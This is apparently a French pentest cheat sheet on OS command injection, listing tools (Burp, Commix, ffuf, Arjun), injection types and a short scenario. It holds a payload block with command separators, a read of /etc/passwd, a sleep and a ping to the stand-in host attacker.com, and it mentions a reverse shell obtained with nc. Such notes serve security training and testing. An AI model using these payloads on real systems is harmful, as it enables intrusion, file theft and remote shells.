
## üñ•Ô∏è Command Injection (OS Command Injection)

---

## Introduction

La <span class="concept">Command Injection</span> (OS Command Injection) permet √† un attaquant d‚Äôinjecter des commandes syst√®me arbitraires dans une application vuln√©rable.

Elle peut permettre :
- Ex√©cution de commandes syst√®me
- Exfiltration de donn√©es
- Contr√¥le total du serveur

Souvent critique : conduit √† un RCE.

---

## Objectifs

- <span class="goal">Identifier des points d‚Äôinjection OS</span>
- <span class="goal">Ex√©cuter des commandes syst√®me cibl√©es</span>
- <span class="goal">Obtenir un shell (reverse shell)</span>

---

## Outils & commandes

| Outil | Exemple & explication |
|-------|-----------------------|
| <span class="technology">Burp Suite (Repeater)</span> | Injection manuelle |
| <span class="technology">Commix</span> | <span class="example">commix --url target --os-cmd whoami</span> |
| <span class="technology">ffuf</span> | <span class="example">ffuf -u target?param=FUZZ -w payloads-cmd.txt</span> |
| <span class="technology">PayloadsAllTheThings</span> | Cheatsheet + payloads |
| <span class="technology">bbot</span> | Recon + param discovery |
| <span class="technology">Arjun</span> | Fuzzing param√®tres |

---

## Types de Command Injection

| Type | Exemple |
|------|---------|
| <span class="concept">Classic</span> | `param=ls` |
| <span class="concept">Chained / Separator</span> | `; whoami` |
| <span class="concept">Blind (boolean)</span> | Test par changement r√©ponse |
| <span class="concept">Blind (time-based)</span> | Injection delay (sleep) |
| <span class="concept">Out-Of-Band</span> | Exfil via DNS / HTTP |

---

## Techniques cl√©s

| Technique | Outil |
|-----------|------|
| <span class="concept">Manual injection</span> | Burp Repeater |
| <span class="concept">Automated testing</span> | Commix |
| <span class="concept">Param discovery</span> | Arjun |
| <span class="concept">Fuzz payloads</span> | ffuf |
| <span class="concept">Bypass filters</span> | manual |

---

## Payloads courants

```
; ls
&& whoami
| id
`cat /etc/passwd`
; sleep 5
`ping -c 5 attacker.com`
```

---

## Bonnes pratiques

- <span class="best-practice">Toujours v√©rifier le contexte (param GET, POST, cookie, header...)</span>
- <span class="best-practice">Limiter le bruit en prod</span>
- <span class="best-practice">Documenter l‚Äôimpact (RCE / data access)</span>
- <span class="mitigation">Ne jamais d√©clencher un DoS involontaire</span>
- <span class="best-practice">Utiliser PayloadsAllTheThings pour payloads adapt√©s</span>

---

## üéØ Exemple de sc√©nario

> <span class="note">üñ•Ô∏è Cible :</span> Interface admin vuln√©rable (param `host`)

Actions :
- <span class="technology">Arjun</span> ‚Üí d√©couverte param `host`
- <span class="technology">Burp Repeater</span> ‚Üí test `; whoami` ‚Üí user `apache`
- <span class="technology">Commix</span> ‚Üí automatisation injection + exfil
- Reverse shell obtenu avec `nc`

---

## Cheatlist Command Injection

| Type | Outils |
|------|--------|
| Manual | Burp, PayloadsAllTheThings |
| Automated | Commix |
| Fuzz | ffuf |
| Param discovery | Arjun, bbot |

---

## üöÄ Navigation

- üöÄ [[06_Path_Traversal]]
- üöÄ [[07_RFI]]
